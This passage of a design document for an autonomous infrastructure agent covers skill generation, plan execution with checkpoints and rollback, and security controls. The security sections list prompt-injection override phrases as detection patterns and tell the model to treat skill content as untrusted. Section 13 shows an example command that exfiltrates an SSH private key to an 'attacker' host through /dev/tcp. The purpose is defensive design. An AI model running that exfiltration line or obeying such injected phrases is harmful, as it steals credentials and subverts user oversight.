│ Need docker skill for LXC 104.                                      │
│                                                                     │
│ → SSH to 10.1.0.109 (docker-host)                                   │
│ → Verify docker installed: docker --version ✓                       │
│ → Explore: docker --help, docker compose --help                     │
│ → Generate skill: ~/.config/chandra/skills/docker/SKILL.md          │
│ → Register skill                                                    │
└───────────────────────────────────┬─────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ STEP 4: GENERATE EXECUTION PLAN                                     │
│                                                                     │
│ Plan: Deploy Nginx via Docker                                       │
│                                                                     │
│ Steps:                                                              │
│   1. Pull nginx:latest image                                        │
│   2. [CHECKPOINT] Confirm deployment parameters                     │
│   3. Run container with port mapping                                │
│   4. Verify container running                                       │
│   5. Test HTTP response                                             │
│                                                                     │
│ Rollback:                                                           │
│   - Step 3: docker rm -f <container>                                │
│   - Step 1: docker rmi nginx:latest (optional)                      │
└───────────────────────────────────┬─────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ STEP 5: CONFIRMATION                                                │
│                                                                     │
│ "I'll deploy Nginx on docker-host (10.1.0.109):                     │
│                                                                     │
│   • Image: nginx:latest                                             │
│   • Container name: nginx-web                                       │
│   • Ports: 80 → 8080                                                │
│   • Restart policy: unless-stopped                                  │
│                                                                     │
│ This will:                                                          │
│   • Pull ~50MB image                                                │
│   • Start a container                                               │
│   • Expose port 8080 on docker-host                                 │
│                                                                     │
│ Proceed?"                                                           │
│                                                                     │
│ User: ✓ Confirm                                                     │
└───────────────────────────────────┬─────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ STEP 6: EXECUTE                                                     │
│                                                                     │
│ → ssh docker-host docker pull nginx:latest                          │
│   latest: Pulling from library/nginx... Done                        │
│                                                                     │
│ → ssh docker-host docker run -d --name nginx-web \                  │
│     --restart unless-stopped -p 8080:80 nginx:latest                │
│   a1b2c3d4e5f6...                                                   │
│                                                                     │
│ → ssh docker-host docker ps --filter name=nginx-web                 │
│   STATUS: Up 2 seconds ✓                                            │
│                                                                     │
│ → curl -s -o /dev/null -w "%{http_code}" http://10.1.0.109:8080     │
│   200 ✓                                                             │
└───────────────────────────────────┬─────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ STEP 7: COMPLETE                                                    │
│                                                                     │
│ "✅ Nginx deployed successfully!                                    │
│                                                                     │
│  Access: http://10.1.0.109:8080                                     │
│                                                                     │
│  Container details:                                                 │
│    • Name: nginx-web                                                │
│    • Host: docker-host (LXC 104)                                    │
│    • Ports: 8080 → 80                                               │
│    • Status: Running                                                │
│                                                                     │
│  You can manage it with:                                            │
│    • 'Stop nginx-web container'                                     │
│    • 'Show nginx logs'                                              │
│    • 'Restart nginx'"                                               │
│                                                                     │
│ Recorded in infrastructure state for future reference.              │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 6. Security Considerations

The autonomy systems have a large attack surface. This section addresses the key risks.

### 6.1 Prompt Injection via Generated Skills

**Risk:** Generated SKILL.md files are created from web search results and --help output,
then injected into future LLM contexts. A maliciously crafted search result or documentation
could embed instructions that end up in a skill.

**Mitigations:**
1. **Review gate for generated skills:** Generated skills are saved with `status: pending_review`
   and do NOT become active until user explicitly approves via `chandra skill approve <name>`.
   
2. **Content sanitization:** Before storing, scan for known injection patterns:
   - "ignore previous instructions", "ignore all previous"
   - "you are now", "act as", "new instructions"
   - "system prompt", "disregard", "override", "bypass"
   - Model-specific tokens: `<|endoftext|>`, `[INST]`, `<<SYS>>`, `</s>`
   - Excessive special characters or control sequences
   
   Flag matches for human review rather than auto-reject (reduces false positives).
   This is not foolproof — prompt injection detection is an active research area.
   The review gate (mitigation #1) is the primary defense; sanitization is defense-in-depth.
   
3. **Clear delimitation:** Generated skill content is wrapped with unique boundary tokens:
   ```
   <<<SKILL_CONTENT:sha256:a1b2c3d4>>>
   [skill content here]
   <<<END_SKILL:sha256:a1b2c3d4>>>
   ```
   The SHA256 is computed from the skill content itself, making it impractical to forge
   a matching END marker. The LLM is instructed that content within these markers is
   external/untrusted and should not be treated as system instructions.
   
4. **Source tracking:** `generated.source` field tracks where content came from for audit.

```go
type GeneratedMeta struct {
    By       string
    Date     time.Time
    Source   string
    Status   string    // "pending_review" | "approved" | "rejected"
    Reviewer string    // User who approved, if applicable
}
```

### 6.2 tools.go Loading (Arbitrary Code Execution)

**Risk:** Section 2.7 describes loading tools.go from skill directories. If skills can include
compiled Go code, this is equivalent to arbitrary code execution.

**Specification:**
- **tools.go is NOT dynamically loaded at runtime.** Go cannot safely load arbitrary code.
- Built-in skills with tools.go are **compiled into the chandrad binary**.
- User-created skills can ONLY use SKILL.md (instructions) + exec tool (CLI commands).
- To add a skill with Go tools, user must add to skills/ source and recompile.

This means the attack surface for user/generated skills is limited to:
- SKILL.md content (prompt injection, mitigated by review gate)
- CLI commands via exec tool (subject to Tier 4 confirmation for destructive ops)

### 6.3 Generated Skill Capability Limits

**Risk:** A generated skill could attempt to declare dangerous capabilities.

**Enforcement:**
- Generated skills cannot include tools.go (see above).
- Generated skills can only reference the `exec` tool for CLI commands.
- Generated skills cannot modify their own trigger patterns to match more broadly than intended.

**Exec execution model:**

Regex-based command inspection is insufficient — it can be bypassed via `sh -c`, `python -c`,
`find -delete`, `xargs`, encoded payloads, and countless other indirection techniques.

**v1 approach: Context-based confirmation tiers**

```go
type ExecContext int

const (
    ExecFromBuiltinSkill   ExecContext = iota  // Compiled-in skill, trusted
    ExecFromApprovedSkill                       // User-approved generated skill
    ExecFromAgentReasoning                      // Agent decided to run command
)

func (e *ExecTool) Execute(ctx context.Context, call ToolCall) (ToolResult, error) {
    execCtx := getExecContext(ctx)
    command := call.Parameters["command"].(string)
    
    switch execCtx {
    case ExecFromBuiltinSkill:
        // Trusted: run with standard destructive-pattern checks only
        if matchesDestructivePattern(command) {
            return requireConfirmation(call, "Built-in skill requesting destructive operation")
        }
        return execute(command)
        
    case ExecFromApprovedSkill:
        // Semi-trusted: ALWAYS confirm first execution of each unique command template
        // After user confirms "gh pr list" once, similar "gh pr list --state open" is OK
        if !hasApprovedCommandTemplate(call.SkillName, command) {
            return requireConfirmation(call, "Generated skill running new command pattern")
        }
        return execute(command)
        
    case ExecFromAgentReasoning:
        // Untrusted: ALWAYS confirm, show full command
        return requireConfirmation(call, "Agent requesting command execution")
    }
}
```

**Command template approval (verb-aware):**
When user approves a command from a generated skill, we extract a **verb-aware** template:
- `gh pr list --state open` → template: `gh pr list *` (read-only)
- `docker ps -a` → template: `docker ps *` (read-only)
- `gh pr merge 123` → template: `gh pr merge *` (mutating, separate approval)

**Critical:** Templates are extracted at the subcommand/verb level, not the resource level.
`gh pr list` approval does NOT unlock `gh pr merge` — they are separate templates.

```go
func extractCommandTemplate(command string) string {
    parts := strings.Fields(command)
    if len(parts) == 0 {
        return ""
    }
    
    // For known CLIs, extract up to the verb level
    switch parts[0] {
    case "gh", "docker", "kubectl", "aws", "gcloud":
        // Keep: <cli> <resource> <verb>
        // gh pr list --foo → gh pr list *
        if len(parts) >= 3 {
            return strings.Join(parts[:3], " ") + " *"
        }
        if len(parts) >= 2 {
            return strings.Join(parts[:2], " ") + " *"
        }
    }
    
    // Default: keep first two tokens
    if len(parts) >= 2 {
        return parts[0] + " " + parts[1] + " *"
    }
    return parts[0] + " *"
}
```

This means `gh pr list` (read) cannot unlock `gh pr merge` (write) or `gh pr close` (mutate).

**What this means for generated skills:**
- First time running any command: requires confirmation
- User sees full command before approving
- Approval is per-command-template, not blanket
- Regex patterns are defense-in-depth, not primary gate

```go
// ValidateGeneratedSkill ensures generated skills don't exceed allowed scope
func ValidateGeneratedSkill(skill *Skill) error {
    if skill.Generated == nil {
        return nil  // Not a generated skill
    }
    
    // Generated skills cannot have embedded tools
    if len(skill.Tools) > 0 {
        return errors.New("generated skills cannot include Go tools")
    }
    
    // Max 10 triggers to prevent overly broad matching
    if len(skill.Triggers) > 10 {
        return fmt.Errorf("too many triggers (%d > 10): would match too broadly", len(skill.Triggers))
    }
    
    // Triggers must be specific (no wildcards, min 4 chars)
    for _, trigger := range skill.Triggers {
        if len(trigger) < 4 || strings.Contains(trigger, "*") {
            return fmt.Errorf("trigger too broad or contains wildcard: %s", trigger)
        }
    }
    
    return nil
}
```

### 6.4 Package Installation Confirmation

**Risk:** `sudo apt install <package>` driven by LLM that saw web search results.

**Enhanced confirmation flow:**
```
"I recommend installing the 'gh' package. Here's the verification:

Package: gh
Version: 2.40.0
Source: GitHub CLI official repository
Description: GitHub's official command line tool
Maintainer: GitHub, Inc.

Install command: sudo apt install gh

This will:
  • Download ~15MB
  • Add the gh binary to /usr/bin
  • No additional services started

[Confirm] [Show apt info] [Cancel]"
```

The confirmation must show:
- Exact package name and version
- Package description from package manager
- Exact install command
- What the install will do

### 6.5 SSH Command Audit Trail

**Risk:** Executor SSHes into hosts to run commands. Need full audit trail.

**Requirement:** All SSH commands logged to action_log with:
- Full command text (not just summary)
- Target host
- Exit code
- Stdout/stderr (truncated if large)
- Timestamp and duration

```go
// After any SSH command execution:
actionLog.Record(ctx, ActionEntry{
    Type:    ActionToolCall,
    Summary: fmt.Sprintf("SSH to %s: %s", host, truncate(command, 100)),
    Details: map[string]any{
        "host":      host,
        "command":   command,  // Full command
        "exit_code": exitCode,
        "stdout":    truncate(stdout, 10000),
        "stderr":    truncate(stderr, 10000),
        "duration":  duration.String(),
    },
    ToolName: "exec",
    Success:  boolPtr(exitCode == 0),
})
```

### 6.6 Checkpoint Timeout Behavior

**Checkpoint timeout configuration:**
```go
type CheckpointConfig struct {
    DefaultTimeout time.Duration // 24h default
    MaxTimeout     time.Duration // 7 days max
    Extendable     bool          // Can user extend via "chandra plan extend <id>"?
}
```

Per-step timeout override in plan:
```go
type ExecutionStep struct {
    // ... existing fields ...
    CheckpointTimeout time.Duration // Override default, 0 = use default
}
```

**Policy:** If a plan checkpoint times out (default 24h, configurable per-step):
1. Mark plan as `status: timeout`
2. Attempt rollback of completed steps
3. Log the timeout and rollback result
4. Notify user: "Plan X timed out waiting for confirmation. Rolled back steps 1-3."

If rollback fails:
1. Mark plan as `status: timeout_partial_rollback`
2. Log exactly what was created and what couldn't be rolled back
3. Notify user with manual cleanup instructions

**Notification delivery when user offline:**
If the user isn't connected (e.g., Discord bot, user offline), notifications are persisted:
- Write to `pending_notifications` table: `{id, user_id, message, created_at, delivered_at}`
- On next session start, check for pending notifications and deliver them immediately
- Notifications expire after 7 days (configurable) and are logged as undelivered
- **Content sanitization:** Notification content is sanitized before storage:
  - Host IPs replaced with host names where possible
  - Credentials/tokens never included in notification text
  - Log entries for expired notifications contain only: plan ID, status, timestamp (not full details)
  - Full operational details remain in action_log with normal retention policy

```go
// At session start:
func (m *SessionManager) onSessionStart(session *Session) {
    pending := m.notifications.GetPending(session.UserID)
    for _, notif := range pending {
        m.channel.Send(ctx, OutboundMessage{
            ChannelID: session.ChannelID,
            Content:   fmt.Sprintf("📬 Missed notification (%s ago):\n%s", 
                                   time.Since(notif.CreatedAt).Round(time.Hour), notif.Message),
        })
        m.notifications.MarkDelivered(notif.ID)
    }
}
```

### 6.7 Infrastructure State Protection

InfrastructureState contains sensitive data (host IPs, credentials, service details).

**Requirements:**
- Store in same SQLite database with same file permissions (0600)
- Credential fields (SSH keys, tokens) are encrypted at rest
- `chandra infra list` shows hosts but masks credentials
- Full credential access requires `chandra infra show <host> --reveal`

**Credential encryption key derivation:**
Option A (default, simpler): Use OS keychain/secret service
- Linux: libsecret / GNOME Keyring / KWallet
- macOS: Keychain
- Key stored under "chandra-credential-key"
- If keychain unavailable, fall back to Option B with warning

Option B (fallback): Passphrase-derived key
- On first run, prompt for encryption passphrase
- Derive key using Argon2id (memory=64MB, iterations=3, parallelism=4)
- Store salt in config, NOT the key itself
- User must provide passphrase on daemon start (or via CHANDRA_PASSPHRASE env var)

Cipher: AES-256-GCM (authenticated encryption)

---

## 7. Plan Persistence Schema

Execution plans must survive daemon restarts. Add to core database schema:

```sql
-- Execution plans
CREATE TABLE execution_plans (
    id              TEXT PRIMARY KEY,
    goal            TEXT NOT NULL,
    status          TEXT NOT NULL,      -- planning | executing | paused | completed | failed | timeout
    current_step    INTEGER DEFAULT 0,
    checkpoint_step INTEGER,            -- non-null if paused at checkpoint
    state           TEXT,               -- JSON: accumulated state across steps
    created_at      INTEGER NOT NULL,
    updated_at      INTEGER NOT NULL,
    completed_at    INTEGER,
    error           TEXT
);
CREATE INDEX idx_plans_status ON execution_plans(status);

-- Execution steps (belong to a plan)
CREATE TABLE execution_steps (
    id              TEXT PRIMARY KEY,
    plan_id         TEXT NOT NULL REFERENCES execution_plans(id),
    step_index      INTEGER NOT NULL,
    description     TEXT NOT NULL,
    skill_name      TEXT,
    action          TEXT NOT NULL,
    parameters      TEXT,               -- JSON
    depends_on      TEXT,               -- JSON array of step IDs
    creates         TEXT,               -- JSON array of resource identifiers
    rollback_action TEXT,               -- JSON: {skill, action, params}
    status          TEXT NOT NULL,      -- pending | running | completed | failed | rolled_back
    output          TEXT,               -- JSON: result of execution
    started_at      INTEGER,
    completed_at    INTEGER,
    error           TEXT
);
CREATE INDEX idx_steps_plan ON execution_steps(plan_id, step_index);

-- Approved command templates (for generated skill exec)
CREATE TABLE approved_commands (
    id              TEXT PRIMARY KEY,
    skill_name      TEXT NOT NULL,
    command_template TEXT NOT NULL,     -- e.g., "gh pr *"
    approved_by     TEXT NOT NULL,
    approved_at     INTEGER NOT NULL,
    last_used       INTEGER
);
CREATE INDEX idx_approved_skill ON approved_commands(skill_name);

-- Pending notifications (for offline users)
CREATE TABLE pending_notifications (
    id              TEXT PRIMARY KEY,
    user_id         TEXT NOT NULL,
    message         TEXT NOT NULL,      -- Sanitized, no credentials
    source_type     TEXT NOT NULL,      -- "plan_timeout" | "plan_complete" | "alert"
    source_id       TEXT,               -- plan_id or other source identifier
    created_at      INTEGER NOT NULL,
    expires_at      INTEGER NOT NULL,   -- 7 days default
    delivered_at    INTEGER             -- NULL until delivered
);
CREATE INDEX idx_pending_user ON pending_notifications(user_id, delivered_at);
```

**Plan status values:**
- `planning` — Planner generating steps
- `executing` — Executor running steps
- `paused` — Waiting at checkpoint for confirmation
- `completed` — All steps succeeded
- `failed` — Step failed, no rollback attempted
- `rolled_back` — Failed and successfully rolled back
- `timeout` — Checkpoint timed out, fully rolled back
- `timeout_partial_rollback` — Checkpoint timed out, partial rollback (needs manual cleanup)

**Recovery on restart:**
1. Load plans with status = 'paused' or 'executing'
2. For 'paused': wait for user confirmation as before
3. For 'executing': check step status using heartbeat/lease model (see below)

**Step heartbeat model (replaces fixed 1-hour timeout):**
Fixed timeouts misclassify legitimate long-running operations (VM creation, image pulls).
Instead, use per-step expected duration + heartbeats:

```go
type ExecutionStep struct {
    // ... existing fields ...
    ExpectedDuration time.Duration  // Estimated: 30s for quick, 10m for VM creation
    Heartbeat        time.Time      // Updated periodically during execution
    HeartbeatTimeout time.Duration  // How long without heartbeat = dead (default: 2x expected)
}
```

**Recovery logic:**
```go
func (e *Executor) recoverStep(step *ExecutionStep) RecoveryAction {
    if step.Status != "running" {
        return NoAction
    }
    
    timeSinceHeartbeat := time.Since(step.Heartbeat)
    timeout := step.HeartbeatTimeout
    if timeout == 0 {
        timeout = 2 * step.ExpectedDuration
    }
    if timeout < 5*time.Minute {
        timeout = 5 * time.Minute  // Minimum 5 min
    }
    
    if timeSinceHeartbeat > timeout {
        // Likely orphaned — attempt rollback
        return Rollback
    }
    
    // Still within expected window — could be slow but healthy
    // Mark for monitoring, don't auto-rollback
    return Monitor
}
```

This distinguishes "slow but healthy" (recent heartbeat) from "orphaned" (no heartbeat).

---

## 8. Package Structure

```
internal/
├── skills/            — skill system
│   ├── registry.go    — SkillRegistry implementation
│   ├── parser.go      — SKILL.md parsing (YAML + markdown)
│   ├── loader.go      — directory scanning, validation
│   ├── generator.go   — skill discovery and creation
│   └── explorer.go    — CLI capability exploration
│
├── planner/           — goal decomposition and planning
│   ├── planner.go     — Planner implementation
│   ├── decompose.go   — goal understanding and step generation
│   ├── graph.go       — capability graph traversal
│   └── gaps.go        — gap identification
│
├── executor/          — plan execution
│   ├── executor.go    — Executor implementation
│   ├── checkpoint.go  — confirmation gate handling
│   └── rollback.go    — rollback mechanics
│
└── infra/             — infrastructure awareness
    ├── state.go       — InfrastructureState management
    ├── discover.go    — infrastructure discovery
    └── hosts.go       — host management
```

---

## 9. Configuration

```toml
[skills]
path = "~/.config/chandra/skills"
require_validation = false          # Warn vs fail on missing requirements
auto_reload = true                  # Watch for skill changes

[planner]
max_steps = 20                      # Maximum steps in a single plan
checkpoint_timeout = "24h"          # How long to wait for confirmation
allow_infra_creation = true         # Can create VMs/containers
allow_software_install = true       # Can install packages

[executor]
parallel_steps = false              # Run independent steps in parallel (v2)
rollback_on_failure = true          # Auto-rollback or leave partial state

[infrastructure]
discovery_interval = "1h"           # How often to scan infrastructure
cache_ttl = "5m"                    # How long to cache state
```

---

## 10. Implementation Phases

The autonomy layer is ambitious. Split into phases to manage risk:

### Phase 1: Skills Core (v2.0)
Minimum viable autonomy — skills load and inject into context.

**In scope:**
- SkillRegistry: Load, Match, Get, All
- SKILL.md parsing (triggers, requirements, content)
- Context injection via CBM (priority, token budget, match limit)
- `chandra skill list/show/reload` commands
- Config: `[skills]` section

**Out of scope:** Generation, discovery, approval workflow, plans, composition.

### Phase 2: Skill Generation (v2.1)
User-triggered skill creation with approval gate.

**In scope:**
- skill_generator tool (web search, package install, CLI exploration)
- Generated skill approval workflow (pending_review → approved)
- ValidateGeneratedSkill enforcement
- `chandra skill approve/reject` commands
- CLI exploration with bounds (depth, timeout, output cap)

**Out of scope:** Autonomous composition, infrastructure awareness, plans.

### Phase 3: Plan Execution (v2.2)
Multi-step plans with checkpoints and rollback.

**In scope:**
- Planner interface (goal → steps)
- Executor interface (run, resume, rollback)
- Plan persistence (execution_plans, execution_steps tables)
- Checkpoint confirmation flow (async, via core confirmations)
- Heartbeat-based recovery
- Command template approval for exec

**Out of scope:** Infrastructure discovery, autonomous goal decomposition.

### Phase 4: Infrastructure Awareness (v2.3)
Full autonomous composition with infrastructure state.

**In scope:**
- InfrastructureManager (discover, track hosts/services)
- Capability graph for planning
- Automatic skill composition ("deploy X" creates skill + plan)
- Credential encryption (OS keychain / Argon2)

---

## 11. Rollback Scope & Limitations

Rollback is **best-effort**, not transactional. The design acknowledges these limitations:

### What Rollback Can Do
- Delete resources created by the plan (containers, VMs, files)
- Undo configuration changes with captured "before" state
- Stop services started by the plan

### What Rollback Cannot Do
- Guarantee atomicity across distributed systems
- Recover from partial failures in external APIs
- Undo side effects that weren't explicitly tracked

### Requirements for Reliable Rollback
Each step that creates resources must capture:
```go
type StepOutput struct {
    CreatedResources []ResourceRef  // What was created
    PreviousState    json.RawMessage // State before change (for config changes)
    Idempotent       bool            // Can rollback action be safely retried?
}

type ResourceRef struct {
    Type  string  // "container", "vm", "file", "service"
    ID    string  // Unique identifier
    Host  string  // Where it lives
}
```

### When Rollback Fails
1. Log exactly what couldn't be rolled back
2. Set plan status to `rolled_back_partial`
3. Generate cleanup instructions for user
4. Store in pending_notifications if user offline

**Design principle:** Prefer explicit cleanup instructions over silent partial rollback.

### Idempotency Over Rollback

The planner should **strongly prefer idempotent actions** over rollback-dependent ones:

```go
type StepIdempotency int

const (
    IdempotentTrue   StepIdempotency = iota // Safe to re-run (mkdir -p, docker pull)
    IdempotentFalse                          // Not safe to re-run (POST /api/create)
    IdempotentUnknown                        // Assume false
)
```

**When a plan fails at step N:**

| Steps 1 to N-1 | Recommended Action |
|----------------|-------------------|
| All idempotent | Leave state as-is, user can re-run after fixing |
| Mixed | Rollback only non-idempotent steps |
| All non-idempotent | Full rollback (risky, may cause more damage) |

**Auto-rollback is opt-in:**
```toml
[plans]
auto_rollback = false           # Default: require explicit rollback command
auto_rollback_idempotent = true # Auto-rollback even idempotent steps? (default: false)
```

When `auto_rollback = false`, failed plans pause with status `failed_awaiting_decision`:
```
Plan deploy-app failed at step 5.
Steps 1-4 completed (all idempotent).

Options:
  chandra plan retry deploy-app    # Fix issue and re-run from step 5
  chandra plan rollback deploy-app # Undo steps 1-4
  chandra plan abandon deploy-app  # Leave as-is, mark complete
```

---

## 12. Concurrency Controls

Mirror core's bounded concurrency approach:

### Plan Execution
```go
type ExecutorConfig struct {
    MaxConcurrentPlans  int           // Default: 2
    MaxConcurrentSteps  int           // Default: 3 (within a plan)
    StepTimeout         time.Duration // Default: 10 min (per step, not global)
}
```

### Skill Generation
```go
type SkillGeneratorConfig struct {
    MaxConcurrentGenerations int           // Default: 1
    GenerationTimeout        time.Duration // Default: 5 min
    MaxPendingReview         int           // Default: 10 (reject new until reviewed)
}
```

### Infrastructure Discovery
```go
type DiscoveryConfig struct {
    MaxConcurrentHosts int           // Default: 5
    HostTimeout        time.Duration // Default: 30s
    FullScanInterval   time.Duration // Default: 1 hour
}
```

### Backpressure
When limits are reached:
- Plan execution: Queue with position feedback ("2 plans ahead of you")
- Skill generation: Reject with message ("Review pending skills first")
- Discovery: Skip hosts, mark stale, retry on next interval

---

## 13. Secret Handling in Exec

Skills requiring secrets (e.g., `env: ["GH_TOKEN"]`) need careful handling:

### Secret Injection
```go
func (e *ExecTool) Execute(ctx context.Context, call ToolCall) (ToolResult, error) {
    command := call.Parameters["command"].(string)
    
    // Get required env vars from skill
    skill := getSkillFromContext(ctx)
    env := os.Environ()
    
    for _, secretName := range skill.Requires.Env {
        // Fetch from secure storage, inject into subprocess env only
        value := e.secrets.Get(secretName)
        env = append(env, secretName+"="+value)
    }
    
    cmd := exec.CommandContext(ctx, "sh", "-c", command)
    cmd.Env = env  // Secrets in env, NOT in command string
    // ...
}
```

### Action Log Scrubbing
```go
func sanitizeForLog(command string, secrets []string) string {
    result := command
    for _, name := range secrets {
        // Scrub any accidental inline secrets
        pattern := regexp.MustCompile(name + `=[^\s]+`)
        result = pattern.ReplaceAllString(result, name+"=[REDACTED]")
    }
    return result
}
```

Never log: full env dumps, secrets in command strings, credential file contents.

### Safe Command Construction

**Critical:** Generated/untrusted skills NEVER use `sh -c`. The template approval
system (`gh pr list *`) can be bypassed via shell operators:
```
gh pr list --state open; cat ~/.ssh/id_rsa > /dev/tcp/attacker/80
```
Template matcher sees "starts with gh pr list" ✓ but shell executes the payload.

**Execution tiers by trust level:**

```go
type CommandExecution int

const (
    ExecDirect    CommandExecution = iota // exec.Command(bin, args...) - no shell
    ExecShellSafe                          // Shell with AST validation
    ExecShellFull                          // Full shell - Tier 4 only
)

func (e *ExecTool) executeCommand(ctx context.Context, skill *Skill, command string) (*exec.Cmd, error) {
    switch e.getTrustLevel(skill) {
    case TrustBuiltin:
        // Built-in skills can use shell features (they're compiled in, trusted)
        return exec.CommandContext(ctx, "sh", "-c", command), nil
        
    case TrustApproved:
        // Generated/approved skills: NO SHELL, direct execution only
        parts, err := parseCommandSafe(command)
        if err != nil {
            return nil, fmt.Errorf("command parsing failed: %w", err)
        }
        if !e.isAllowedBinary(parts[0], skill) {
            return nil, fmt.Errorf("binary %s not in skill's allowed list", parts[0])
        }
        return exec.CommandContext(ctx, parts[0], parts[1:]...), nil
        
    case TrustUntrusted:
        // Unknown: always Tier 4 confirmation with full command shown
        return nil, ErrRequiresConfirmation
    }
}

// parseCommandSafe splits command into args, rejects shell operators
func parseCommandSafe(command string) ([]string, error) {
    // Use proper shell parser (mvdan.cc/sh/v3/syntax) to parse AST
    // Reject if AST contains: ;, &&, ||, |, >, <, $(), backticks
    // Return only simple command with arguments
}
```

**If shell features are required** (pipes, redirects):
1. Skill must explicitly declare `requires_shell: true` in SKILL.md
2. Always Tier 4 confirmation regardless of template approval
3. Use shell AST parser to validate no dangerous constructs
4. Log full command to action_log

---

## 14. Hierarchical Context Injection

Full SKILL.md content (500+ tokens) can bloat context. Use hierarchical injection:

### Two-Phase Injection
1. **Phase 1:** Inject only `Summary` field (< 100 tokens) for all matched skills
2. **Phase 2:** If agent decides to use a skill, it calls `read_skill` tool to get full content

```go
// Built-in tool for fetching full skill content
type ReadSkillTool struct{}

func (r *ReadSkillTool) Definition() ToolDef {
    return ToolDef{
        Name:        "read_skill",
        Description: "Get full documentation for a skill",
        Parameters: map[string]any{
            "skill_name": {"type": "string", "description": "Name of the skill"},
        },
        Tier: TierBuiltin,
    }
}

func (r *ReadSkillTool) Execute(ctx context.Context, call ToolCall) (ToolResult, error) {
    name := call.Parameters["skill_name"].(string)
    skill, ok := registry.Get(name)
    if !ok {
        return ToolResult{Error: "skill not found"}, nil
    }
    return ToolResult{Content: skill.Content}, nil
}
```

### Context Assembly
```go
for _, skill := range matchedSkills {
    if len(skill.Summary) > 0 {
        // Inject summary only (saves tokens)
        candidates = append(candidates, ContextCandidate{
            Content:  fmt.Sprintf("[Skill: %s] %s\nUse read_skill(\"%s\") for full docs.", 
                                  skill.Name, skill.Summary, skill.Name),
            Priority: 0.7,
            Tokens:   countTokens(skill.Summary) + 20,
        })
    } else {
        // No summary, inject full content (legacy behavior)
        candidates = append(candidates, ContextCandidate{
            Content:  skill.Content,
            Priority: 0.7,
            Tokens:   countTokens(skill.Content),
        })
    }
}
```

---

## 15. Plan Debugging & Dry-Run

### Dry-Run Mode
For complex plans, allow preview without execution:

```bash
$ chandra plan run "deploy nginx on docker01" --dry-run

Plan: deploy-nginx-abc123
Steps:
  1. [docker] Check if nginx image exists
     → docker images nginx:latest --format '{{.ID}}'
  2. [docker] Pull nginx if missing
     → docker pull nginx:latest
  3. [docker] Create container
     → docker run -d --name nginx-web -p 80:80 nginx:latest
  4. [checkpoint] Confirm deployment
  5. [exec] Verify container running
     → docker ps --filter name=nginx-web

Resources to be created:
  • Container: nginx-web on docker01

Estimated duration: 2-5 minutes
Run without --dry-run to execute.
```

### Plan Status & Tree
```bash
$ chandra plan status abc123

Plan: deploy-nginx-abc123
Status: paused (at checkpoint)
Progress: 3/5 steps complete

┌─ Step 1: Check if nginx image exists ✓
│  Output: sha256:a1b2c3...
├─ Step 2: Pull nginx if missing ✓
│  Output: (skipped, image exists)
├─ Step 3: Create container ✓
│  Created: container:nginx-web@docker01
├─ Step 4: Confirm deployment ⏸️ WAITING
│  Approve: chandra confirm abc123
└─ Step 5: Verify container running (pending)
```

### Chat/Discord Approval UX
For non-CLI surfaces, use interactive elements:

```go
// When sending checkpoint notification to Discord
func (c *DiscordChannel) SendCheckpoint(plan *ExecutionPlan, step int) {
    c.Send(OutboundMessage{
        Content: fmt.Sprintf("Plan %s needs confirmation at step %d:\n%s", 
                             plan.ID, step, plan.Steps[step].Description),
        Components: []Component{
            Button{Label: "✅ Approve", Action: "confirm:" + plan.ID},
            Button{Label: "❌ Reject", Action: "reject:" + plan.ID},
            Button{Label: "📋 Show Plan", Action: "show:" + plan.ID},
        },
    })
}
```

---

## 16. State Size Limits & Ephemeral State

### Ephemeral vs Persistent State

Step outputs may contain sensitive short-lived data (tokens, temp passwords) that
shouldn't be persisted to disk:

```go
type StepOutput struct {
    // Persisted to SQLite, survives restart
    Persistent map[string]any
    
    // In-memory only, lost on restart
    Ephemeral map[string]any
}

// Steps declare output type explicitly
type ExecutionStep struct {
    // ... existing fields ...
    OutputMode OutputMode // persistent | ephemeral | auto
}

type OutputMode int

const (
    OutputAuto       OutputMode = iota // Infer from content (default)
    OutputPersistent                    // Always persist
    OutputEphemeral                     // Never persist, memory only
)

// Auto-detection for OutputAuto:
func classifyOutput(key string, value any) OutputMode {
    // Ephemeral if key contains: token, password, secret, key, credential
    // Ephemeral if value looks like JWT, API key pattern
    // Persistent otherwise
}
```

**Recovery behavior:**
- If daemon restarts mid-plan, ephemeral state is lost
- Plan resumes but steps depending on ephemeral data must re-run
- Steps can declare `depends_on_ephemeral: true` to force re-execution

### Size Limits

Prevent database bloat from large step outputs:

```go
const (
    MaxStepOutputBytes = 64 * 1024   // 64KB per step
    MaxPlanStateBytes  = 256 * 1024  // 256KB total accumulated state
)

func (e *Executor) recordStepOutput(planID string, stepIndex int, output any) error {
    data, _ := json.Marshal(output)
    
    if len(data) > MaxStepOutputBytes {
        // Truncate and note truncation
        truncated := map[string]any{
            "_truncated": true,
            "_original_size": len(data),
            "_summary": summarizeOutput(output),
        }
        data, _ = json.Marshal(truncated)
    }
    
    // Also check accumulated state size
    plan := e.getPlan(planID)
    if len(plan.State) + len(data) > MaxPlanStateBytes {
        return errors.New("plan state size limit exceeded")
    }
    
    return e.store.UpdateStepOutput(planID, stepIndex, data)
}
```

---

## 17. Heartbeat Implementation Notes

Since `exec.Cmd.Wait()` blocks, heartbeats need a separate goroutine:

```go
func (e *Executor) runCommandWithHeartbeat(ctx context.Context, step *ExecutionStep, cmd *exec.Cmd) error {
    // Start heartbeat ticker
    done := make(chan struct{})
    go func() {
        ticker := time.NewTicker(30 * time.Second)
        defer ticker.Stop()
        for {
            select {
            case <-ticker.C:
                e.updateHeartbeat(step.PlanID, step.Index)
            case <-done:
                return
            case <-ctx.Done():
                return
            }
        }
    }()
    
    // Run command
    err := cmd.Run()
    close(done)  // Stop heartbeat goroutine
    
    return err
}
```

**Batching consideration:** If many steps run concurrently, batch heartbeat writes:
```go
type HeartbeatBatcher struct {
    pending map[string]time.Time  // step_id -> last heartbeat
    mu      sync.Mutex
    ticker  *time.Ticker
}

func (b *HeartbeatBatcher) Record(stepID string) {
    b.mu.Lock()
    b.pending[stepID] = time.Now()
    b.mu.Unlock()
}

func (b *HeartbeatBatcher) flushLoop() {
    for range b.ticker.C {
        b.mu.Lock()
        if len(b.pending) > 0 {
            b.store.BatchUpdateHeartbeats(b.pending)
            b.pending = make(map[string]time.Time)
        }
        b.mu.Unlock()
    }
}
```

---

